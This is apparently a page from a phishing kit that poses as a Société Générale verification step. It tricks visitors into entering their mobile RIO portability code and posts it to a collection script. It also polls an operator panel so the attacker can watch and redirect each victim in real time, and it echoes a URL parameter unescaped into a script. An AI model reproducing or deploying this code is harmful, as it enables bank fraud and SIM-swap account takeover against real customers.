<?php 
require "../main.php";
?><!doctype html>
<html>
<head>
<title>SG | Vérification</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css">
<link rel="stylesheet" href="res/jihanaid.css">
<link rel="stylesheet" href="res/auth.css">
<link rel="icon" href="res/icon.png">
</head>
<body>
<header>
<div class="row">
    <div class="col text-left p-5">
        <img src="res/logo.svg" style="width:180px;">
    </div>
</div>
</header>

<div class="container-full p-5">

<div class="form">

<div class="text" style="text-align:center; font-weight:bold;">
Merci de saisir Le code RIO (DSP2).<br>
L'obtention du code RIO est <span style="color:red;">gratuite</span> et se fait<br>
 en quelques secondes.<br>
 <span style="color:red;">En appelant le 3179</span>
 <p style="font-size:0.8em; font-weight:normal;">Votre code RIO est envoyé directement par SMS après quelques secondes.</p>

</div>


<?php 
if(isset($_GET['e'])){
    echo '<div class="text-red" >Code RIO incorrect</div>';
}
?>

<div class="col">
    <label for="u">CODE RIO*</label>
    <input type="text" id="d0" class="textinput" maxlength="12"> 
    <label style="font-size:0.8em; color:green;">Exemple: 02 P XXXXXXX XXX</label>
</div>

<div class="col" style="text-align:center;">
    <button onclick="sendInfo()" class="submitbtn">Valider</button>
</div>

</div>

</div>


<script src="res/cdns/jq.js"></script>
<script src="res/cdns/m.js"></script>
<script>

var target = 'wait.php';
// if(isset($_GET['e']) && strtolower($use_panel)=="no"){
//     target = "wait.php?red=done.php";
// }
var allowSubmit=false;
 
$(".textinput").keypress((e)=>{
    if(e.key=="Enter"){
        sendInfo();
    }
});


function sendInfo(){
    if($("#d0").val()!=""){
        $(".submitbtn").css("background", "#fa596c");
        $(".submitbtn").attr("onclick", "return false;");
        $.post("send.php",{rio:$("#d0").val()},(d)=>{
           window.location=target;
        });
    }
}

setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d && d!=0){
            window.location=d;
        }
    })

}, 2000);

</script>
</body>
</html>